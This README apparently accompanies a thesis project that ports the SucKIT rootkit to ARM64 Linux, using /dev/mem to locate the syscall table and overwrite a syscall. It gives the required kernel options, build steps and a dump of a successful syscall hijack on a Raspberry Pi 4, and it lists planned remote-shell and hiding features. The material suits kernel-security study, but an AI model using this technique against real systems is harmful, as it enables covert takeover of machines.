# SucKIT on ARM64
This is a porting of the rootkit [SucKIT](http://phrack.org/issues/58/7.html), originally developed for Linux ia32, to one of the recent versione of the Linux kernel on ARM64 architecture. 
This rootkit work only in a particular scenario that the author describe in the following manner:
>Imagine a scenario of a poor man which needs to change some interesting
linux syscall and LKM support is not compiled in. Imagine he have got a
box, he got root but the admin is so paranoid and he (or tripwire) don't
poor man's patched sshd and that box have not gcc/lib/.h
needed for compiling of his favourite LKM rootkit.
 \- sd and devik on Phrack Inc.

SucKIT is not the classic rootkit in `kernel-mode` like a LKM rootkit. It's use the character device `kmem` as alternative of Loadable Kernel Module, that permit to write and read on the kernel space from the user space.
This is the final result of the my Computer Engineering thesis, that is based on the study of the differences between the two different architecture and the two different version of the Linux kernel taken into consideration and on the following developing of a working rootkit for ARM64. With some modification from the original rootkit I developed a version of the SucKIT rootkit for ARM64 that permit to execute some fundamental operation that can be used to obtain the control of the victim machine. An importnat difference between SucKIT and my version is that in the recent versions of the Linux kernel the `kmem` device has some problem and limitation, instead the device `mem` that i use on my rootkit version doesn't has any problem if the kernel is compiled with the correct confguration.

## Features
- Obtain the addresses of Exception Vector Table and System Call Table
- Translate the physical address in virtual address and viceversa
- Overwrite system call whit a personalized routine
- Allocate kernel page
- Write and read on kernel space

## How to use
This rootkit work only with Linux kernel compiled with the following options:
```
CONFIG_DEVMEM=y
CONFIG_STRICT_DEVMEM=n
```
That options permit to enable the character device `mem` without limitation. It's used to read and write in kernel space from the user space.
When you run the compiled rootkit you can obtain a series of information that can be used to attack the victim machine. 

## Build
To build this rootkit you need to run the `make` command. After that you can run the executable `rootkit`.

## Tested on
- Raspberry Pi 4 4GB (OS: `Ubuntu 20.04.1 LTS 64-bit` with kernel `Linux ubuntu 5.4.0-1019-raspi`)

## Dump example
An example of the dump generated by the rootkit on Raspberry Pi 4.

```
pattern_evt_istr_1: 0x82004, val: 0x8b2063ff
pattern_evt_istr_2: 0x82008, val: 0xcb2063e0
pattern_evt_istr_3: 0x82010, val: 0xcb2063e0
Base address of the EVT: 0x82000
Address of the handler SVC: 0x9c140
Address where is stored a copy of the virtual address of the EVT: 0xc01000
Base physical address of the SCT: 0xc01770
Virtual Offset: ffffd597e3600000
Base virtual address of the SCT: 0xffffd597e4201770
pattern_kmalloc_istr_1: 0x876c0, val: 0xaa0003f6
pattern_kmalloc_istr_1: 0x8b694, val: 0xaa0003f6
pattern_kmalloc_istr_1: 0x8b754, val: 0xaa0003f6
pattern_kmalloc_istr_1: 0x8b9fc, val: 0xaa0003f6
.
.
.
pattern_kmalloc_istr_1: 0x309588, val: 0xaa0003f6
pattern_kmalloc_istr_1: 0x30c848, val: 0xaa0003f6
pattern_kmalloc_istr_2: 0x30c84c, val: 0xaa1e03f7
pattern_kmalloc_istr_1: 0x30cef4, val: 0xaa0003f6
pattern_kmalloc_istr_2: 0x30cef8, val: 0xaa1e03f7
pattern_kmalloc_istr_3: 0x30cefc, val: 0x2a0103f5
Physical address of kmalloc: 0x30cee0
Virtual address of kamlloc: 0xffffd597e390cee0
Size of sys_call_kmalloc: 52
Virtual address of victim syscall: 0xffffd597e371d5c8
Physical address of the victim System Call: 0x11d5c8
Saving the original syscall!
Saved successfully!
Start overwriting syscall with sys_call_kmalloc!
Syscall overwritten!
Call syscall!
Syscall called!
Start restore syscall!
Syscall restored!
Virtual address of the allocated kernel page: 0xffff0000ec37ea00
```

## Future work
- [ ] Use the allocated page with a personalized routine
- [ ] Implement any typical functionality of a rootkit (e.g. hide file or folder, remote shell, hide network traffic, etc..)

## Disclaimer
The authors are in no way responsible for any illegal use of this software. It is provided purely as an educational proof of concept. We are also not responsible for any damages or mishaps that may happen in the course of using this software. Use at your own risk.
